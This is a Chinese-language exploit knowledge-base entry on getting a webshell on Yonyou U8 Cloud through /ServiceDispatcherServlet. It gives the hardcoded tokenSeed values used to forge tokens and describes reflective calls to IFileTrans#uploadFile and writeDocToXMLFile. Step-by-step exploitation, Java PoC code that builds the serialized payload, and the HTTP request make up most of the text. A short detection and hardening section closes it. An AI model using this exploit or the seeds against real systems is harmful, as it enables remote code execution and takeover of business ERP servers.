---
id: web-java-component-yonyou-u8-serviceDispatcher-invocationinfo-token-file-write
title: 用友 U8 Cloud ServiceDispatcherServlet：InvocationInfo 反序列化 + 硬编码 tokenSeed 伪造 token 反射调用文件写入方法 getshell
type: scenario
domain: web
path: web/java/component
technique: yonyou-u8-servicedispatcher-invocationinfo-reflection-file-write
tags:
- java
- yonyou
- u8-cloud
- deserialization
- invocationinfo
- token-forgery
- reflection
- file-upload
- webshell
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V54
  verified_at: '2026-11-05T09:01:59+08:00'
  notes: 已对照原文及24张图核对：图01/02 web.xml CommonServletDispatcher→/ServiceDispatcherServlet；图03/04 execCall 用 NetObjectInputStream.readObject(...,new Class[]{InvocationInfo.class})；图17-19 resolveClass 仅放行 InvocationInfo 及子类；图05/06 TokenUtil.verifyToken→verifyTokenIllegal→genToken(userCode)=md5(tokenSeed,userCode.getBytes())；图15 tokenSeed.conf 值 ab7d823e-...；图16 默认种子 232asfdsjkfmsdgldfg；图07 invokeBeanMethod 反射 getMethod+invoke；图09 FileTransImpl.uploadFile 先 ZipUtil.extract 再 FileOutputStream 写 remoteAbsPath；图22-24 IPFxxFileService.writeDocToXMLFile→FileUtils.writeBytesToFile；图20 序列化请求、图21 /llx.jsp 返回 Hello World。原文无受影响版本区间，未设 affected_versions。PoC 未在本机执行。
url: /docs/web/java/component/web-java-component-yonyou-u8-servicedispatcher-invocationinfo-token-file-write/
draft: false
kb_aliases:
- 用友 U8cloud ServiceDispatcherServlet
- ServiceDispatcherServlet 反序列化
- InvocationInfo 反序列化文件上传
- 用友 tokenSeed 伪造 token
- FileTransImpl uploadFile
- IPFxxFileService writeDocToXMLFile
- 用友 U8 getshell
---

## 一句话结论

用友 U8 Cloud 的 `/ServiceDispatcherServlet` 只允许反序列化 `InvocationInfo`，但该对象里的 `serviceName`、`methodName`、`parameterTypes`、`parameters`、`userCode` 全部可控；攻击者用硬编码的 tokenSeed 计算出 `md5(tokenSeed, userCode)` 伪造合法 token，即可让服务端反射调用 `IFileTrans#uploadFile` 或 `IPFxxFileService#writeDocToXMLFile`，把 ZIP/字节内容写到 Web 目录下的任意路径，落地 JSP WebShell。

## 原理

- **入口与反序列化限制**：`web.xml` 把 `CommonServletDispatcher` 映射到 `/ServiceDispatcherServlet`；`doGet` 调用 `serviceHandler.execCall()`。`execCall` 使用 `NetObjectInputStream.readObject(in, streamRet, lsizes, new Class[]{InvocationInfo.class})`，底层 `NCObjectInputStream` 在 `resolveClass()` 中通过 `c.isAssignableFrom(superImpl)` 只放行 `InvocationInfo` 及其子类，因此不能直接打通用 gadget 链，但反序列化出的 `InvocationInfo` 字段完全可控。
- **token 校验可伪造**：`execCall` 随后调用 `TokenUtil.verifyToken(token, serviceName, clientIP)`；在非单机/非 master 或服务、IP 不受信任时进入 `verifyTokenIllegal()`：
  ```java
  String userCode = InvocationInfoProxy.getInstance().getUserCode();
  String curToken = this.genToken(userCode);
  if (!curToken.equalsIgnoreCase(token)) throw new BusinessRuntimeException("token error!");
  ```
  `userCode` 来自反序列化对象；`genToken()` 为 `md5(tokenSeed, userCode.getBytes())` 的十六进制串。`tokenSeed` 来自 `/ierp/bin/token/tokenSeed.conf` 的 `tokenseed`（原文文件值为 `ab7d823e-03ef-39c1-9947-060a0a08b931`），文件不存在/为空时回退到硬编码默认值 `232asfdsjkfmsdgldfg`。种子是固定或可预知的，因此攻击者可离线计算任意 `userCode` 对应的 token。
- **反射调用任意 Bean 方法**：校验通过后 `invokeBeanMethod(module, serviceName, methodName, parameterTypes, parameters)` 按 `serviceName` 从容器上下文 `lookup` 到 Bean，再执行：
  ```java
  Method bm = o.getClass().getMethod(methodName, parameterTypes);
  bm.setAccessible(true);
  Object result = bm.invoke(o, beanParameters);
  ```
  方法名、参数类型、参数值全部来自 `InvocationInfo`，等价于对容器内任意 Bean 的任意 public 方法进行一次可控调用。
- **文件写入 sink 1**：`nc.itf.hr.tools.IFileTrans#uploadFile(byte[] data, String remoteAbsPath)`：
  ```java
  data = ZipUtil.extract(data);                 // data 是 ZIP
  FileOutputStream output = new FileOutputStream(remoteAbsPath);
  output.write(data); output.flush(); output.close();
  ```
  先解压攻击者提供的 ZIP，再把解压内容写到任意路径，路径无校验，可直接写 `webapps/u8c_web/llx.jsp`。
- **文件写入 sink 2**：`IPFxxFileService#writeDocToXMLFile(byte[] filedata, String filename)` 调用 `FileUtils.writeBytesToFile(filedata, filename)`：
  ```java
  File file = new File(filename);
  File fileParent = file.getParentFile();
  if (!fileParent.exists()) fileParent.mkdirs();
  FileOutputStream outStream = new FileOutputStream(file);
  outStream.write(filedata); outStream.close();
  ```
  直接写原始字节，无需 ZIP 包装，同样可落地任意 JSP。
- 原文实测 sink 1 成功：构造 `InvocationInfo("nc.itf.hr.tools.IFileTrans","uploadFile", new Class[]{byte[].class,String.class}, {zipBytes, ".\\webapps\\u8c_web\\llx.jsp"})`，设置 token/userCode 后序列化发送，访问 `/llx.jsp` 返回 `Hello World`，确认 WebShell 执行。

## 触发条件

- 目标为存在 `/ServiceDispatcherServlet`（`CommonServletDispatcher` + `ServiceDispatcher`）的用友 U8 Cloud 版本，接口可从攻击者网络访问。
- 目标 classpath 存在 `nc.itf.hr.tools.IFileTrans#uploadFile` 或 `IPFxxFileService#writeDocToXMLFile` 等可写文件的 Bean 方法。
- 攻击者能读取或猜测 tokenSeed：默认值 `232asfdsjkfmsdgldfg` 硬编码在 TokenUtil；`/ierp/bin/token/tokenSeed.conf` 的 `tokenseed` 亦为固定值，源码/配置泄露即可获得。
- 目标 Web 根目录（如 `webapps/u8c_web/`）对应用进程可写，且 JSP 可被解析。
- 需要能构造并发送 `InvocationInfo` 的序列化字节流（`NetObjectOutputStream` 或兼容实现）。

## 利用步骤

1. 确认 `/ServiceDispatcherServlet` 可访问（POST，`Content-Type: application/octet-stream`）。
2. 获取 tokenSeed：优先读 `/ierp/bin/token/tokenSeed.conf` 的 `tokenseed`；否则使用 TokenUtil 默认值 `232asfdsjkfmsdgldfg`（两者都在原文中出现）。
3. 选定 `userCode`（如 `#UAP#`），按 `genToken(userCode) = hex(md5(tokenSeed, userCode.getBytes()))` 计算 token。
4. 准备 JSP 内容：
   - sink 1：把 JSP 文件打包成 ZIP，读取 ZIP 字节作为 `data`，目标路径如 `.\\webapps\\u8c_web\\llx.jsp`；
   - sink 2：直接读取 JSP 字节作为 `filedata`，目标路径相同。
5. 构造 `InvocationInfo`：`serviceName=nc.itf.hr.tools.IFileTrans`、`methodName=uploadFile`、`parameterTypes={byte[].class,String.class}`、`parameters={data,path}`，设置 `token`、`userCode`，序列化后作为请求体发送。
6. 访问 `http://target:8088/llx.jsp` 验证执行（原文返回 `Hello World`）；失败时尝试其他 Web 根路径或 sink 2。

## PoC

```java
public class Serial {
    public static void main(String[] args) throws Exception {
        byte[] data = createData("D:\\Java\\用友\\U8cloud\\U8CERP\\external\\llx.jsp"); // ZIP 内含 JSP
        Object[] params = {data, ".\\webapps\\u8c_web\\llx.jsp"};
        InvocationInfo invocationInfo = new InvocationInfo(
                "nc.itf.hr.tools.IFileTrans", "uploadFile",
                new Class[]{byte[].class, String.class}, params);
        invocationInfo.setToken("<按 tokenSeed 与 userCode 计算的 md5>");
        invocationInfo.setUserCode("#UAP#");
        FileOutputStream fos = new FileOutputStream("./llx.ser");
        NetObjectOutputStream.writeObject(fos, invocationInfo);
    }

    public static byte[] createData(String filePath) throws IOException {
        File file = new File(filePath);
        byte[] fileBytes = new byte[(int) file.length()];
        try (FileInputStream fis = new FileInputStream(file)) { fis.read(fileBytes); }
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ZipOutputStream zos = new ZipOutputStream(baos)) {
            zos.putNextEntry(new ZipEntry("compressed"));
            zos.write(fileBytes);
            zos.closeEntry();
        }
        return baos.toByteArray();
    }
}
```

```http
POST /ServiceDispatcherServlet HTTP/1.1
Host: target:8088
Content-Type: application/octet-stream

<llx.ser 序列化字节>
```

```text
# 原文结果：访问 http://target:8088/llx.jsp 返回 "Hello World"
```

## 变体与关联

- 变体 sink 2：把 `serviceName/methodName/parameterTypes` 换成 `IPFxxFileService#writeDocToXMLFile(byte[], String)`，字节直接落盘，不需要 ZIP；构造方式与 sink 1 相同。
- 变体：`invokeBeanMethod` 对容器内任意 Bean 反射调用，除文件写入外还可寻找命令执行、配置修改、数据源操作等方法作为 sink。
- 关联：`[[web-java-component-yonyou-u8-nccloudgateway-ifiletrans-file-upload]]`（同产品、同样利用 IFileTrans 写入，但入口是 NCCloudGatewayServlet + gatewaytoken）；`[[web-java-component-yonyou-nccloud-gateway-reflection-command-injection]]`（同为反射调用 Bean 方法的思路）。
- 边界：反序列化仅允许 `InvocationInfo`，无法直接使用 CC 等 gadget；token 校验在单机/master 或被信任服务/IP 时可能被跳过；写入路径必须是进程可写且目标服务器解析 JSP。

## 检测与防御

- 检测：`/ServiceDispatcherServlet` 收到 `application/octet-stream` 序列化请求且响应为二进制/JSON 混合；序列化对象包含 `InvocationInfo`、`nc.itf.hr.tools.IFileTrans`、`uploadFile`、`writeDocToXMLFile` 等特征；`webapps` 目录出现新 JSP；`token` 与 `userCode` 组合异常。
- 修复：升级用友官方补丁，避免使用硬编码 tokenSeed，改为按部署随机生成并保护 `tokenSeed.conf`；对 `InvocationInfo` 的 `serviceName/methodName` 做白名单校验，禁止反射调用文件写入类方法。
- 加固：`/ServiceDispatcherServlet` 限制来源 IP/网络；配置目录与 Web 目录权限分离；应用进程最小权限运行；JSP 目录写入监控与完整性校验。
